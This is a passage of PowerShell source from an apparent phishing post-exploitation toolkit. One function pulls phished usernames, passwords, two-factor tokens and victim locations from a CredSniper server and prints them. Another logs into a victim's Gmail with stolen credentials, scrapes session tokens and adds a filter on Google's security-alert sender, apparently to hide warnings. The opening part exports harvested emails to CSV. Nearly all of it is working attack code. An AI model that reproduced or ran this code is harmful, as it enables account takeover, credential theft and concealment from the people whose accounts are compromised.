            $EmailObject = New-Object System.Object
            $EmailObject | Add-Member -Type NoteProperty -name Subject -Value $MailSubject
            $EmailObject | Add-Member -Type NoteProperty -name Sender -Value $MailSender[1]
            $EmailObject | Add-Member -Type NoteProperty -name Receiver -Value $MailReceiver
            $EmailObject | Add-Member -Type NoteProperty -name Body -Value $MailBody
            $fullresultsarray += $EmailObject

            Write-Output "Subject: $MailSubject"
            Write-Output "Sender: $MailSender"
            Write-Output "Receiver: $MailReceiver"     
          
            Write-Output "`n"
            $count++
        }
        

        $fullresultsarray | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace "`n",'\n' -replace "`r",'\n' -replace ",",'&#44;'}
        $fullresultsarray | Export-Csv -Encoding UTF8 $OutputCsv
        Write-Output "[*] Results have been written to $OutputCsv."
}

Function Invoke-MonitorCredSniper{

    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $ApiToken = "",

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $CredSniper = "",

        [Parameter(Position = 2, Mandatory = $false)]
        [int]
        $Interval = 1
    )

    Write-Output "[*] Initializing CredSniper monitor..."

    # Collection of seen usernames
    $Seen = New-Object System.Collections.ArrayList

    # Stay Looping
    while(1)
    {
        # Properly setup URI and make request to CredSniper API
        $CredSniper = $CredSniper.trim('/')
        $CredSniperRequest = Invoke-WebRequest -Uri "$CredSniper/creds/view?api_token=$ApiToken"
        $CredsJson = $CredSniperRequest.Content | ConvertFrom-Json

        # Loop through credentials from CredSniper
        foreach($cred in $CredsJson.creds)
        {
            # CredSniper internal identifier for credential
            $cred_id = $cred.cred_id

            # IP Address of Victim
            $ip_address = $cred.ip_address

            # Username/Email captured
            $username = $cred.username

            # Password captured
            $password = $cred.password

            # GeoIP City
            $city = $cred.city

            # GeoIP Region/State
            $region = $cred.region

            # GeoIP Zip Code
            $zip_code = $cred.zip_code

            # 2FA Type (sms, authenticator, touchscreen, u2f)
            $twofactor_type = $cred.two_factor_type

            # 2FA Token
            $twofactor_token = $cred.two_factor_token

            # CredSniper internal marked as seen flag
            $already_seen = $cred.seen

            # Check to see if username has already been seen
            If ($Seen -notcontains $username)
            {
                # Monitor if we have already seen this credential so we don't hit duplicates
                $Seen.Add($username) | out-null

                # Print output for user
                Write-Output "[*] $username, $password, $twofactor_type, $twofactor_token, $city, $region, $zip_code"
            }
        }

        # Sleep for a little while
        Start-Sleep -seconds $Interval
    }
}

Function Invoke-AddGmailRule{

    Param
    (

        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $EmailAddress = "",

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password = ""
    )

        #Start a new Google session and input the email address of the user who will be creating the event
        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        $EmailForm = $SessionRequest.Forms[0]
        $EmailForm.Fields["Email"]= $EmailAddress
        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)

        #Submit the authentication for the user and maintain a valid session in $googlesession
        $PasswordForm = $EmailSubmitRequest.Forms[0]
        $PasswordForm.Fields["Email"]= $EmailAddress
        $PasswordForm.Fields["Passwd"]= $Password
        Write-Output "[*] Now logging into account with provided credentials"
        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
        foreach ($cookie in $cookies)
        {
            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
            {
                $PrimarySIDExists = $true
            }
        }
        if ($PrimarySIDExists)
        {
            Write-Output "[*] Authentication appears to be successful"
        }
        else
        {
            Write-Output "[*] Authentication appears to have failed. Check the credentials."
            break
        }


        #Parse 'ik' and 'at'
        $SettingsLoad = Invoke-WebRequest -Uri ("https://mail.google.com/mail/u/0/#settings/filters") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
        Write-Output "[*] Obtaining 'ik' and 'at'"

        $GetIKParam = 's_jr=[null,[[null,null,null,null,null,null,[null,true,false]],[null,[null,"test",0,null,30,null,null,null,false,[],[]]]],2,null,null,null,""]'
        $GetGmailSession = Invoke-WebRequest -Uri "https://mail.google.com/mail" -WebSession $googlesession
        $GetIKRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $GetIKParam
        $GetIKRequest.Content -match @'
(?<=user key\ ')[A-Za-z0-9]*(?='\")
'@ | out-null

        $ik = $Matches[0]

        $SettingsLoad.tostring() -match '(?<=GM_ACTION_TOKEN=\").*(?=\";var)' | out-null
        $at = $Matches[0]

        $GEventHeaders = @{'Accept'='*/*';'X-Same-Domain'='1';'Content-Type'='application/x-www-form-urlencoded;charset=utf-8';'Referer'='https://mail.google.com/render?pli=1';'Accept-Language'='en-US';'Accept-Encoding'='gzip; deflate';'User-Agent'='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv=11.0) like Gecko';'Host'='mail.google.com';'Cache-Control'='no-cache'}
        $GEventParams = "search=cf&cf1_from=no-reply%40accounts.google.com&cf1_sizeoperator=s_sl&cf1_sizeunit=s_smb&cf2_tr=true&"

        #Adding rule
        Write-Output "[*] Now adding filter rule into Gmail settings"
        $RuleAdding = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/?ui=2&ik=$ik&jsver=a&rid=a&at=$at&view=up&act=cf&_reqid=a&pcd=1&cfact=a&cfinact=a&mb=0&rt=c&search=cf&cf1_from=no-reply%40accounts.google.com&cf1_sizeoperator=s_sl&cf1_sizeunit=s_smb" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body $GEventParams

        #Rule verification
        $CheckingRuleExists = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/#settings/filters" -WebSession $googlesession -Method GET -Headers $GEventHeaders
        if($CheckingRuleExists.tostring() -match 'no-r<wbr>eply@accou<wbr>nts.google<wbr>.com')
        {
            Write-Output "`nLooks like something may have gone wrong. Maybe login to Gmail directly and check to see if the rule was created."
        } else {
            Write-Output "[*] Success! The rule has been added successfuly`n"
        }
}
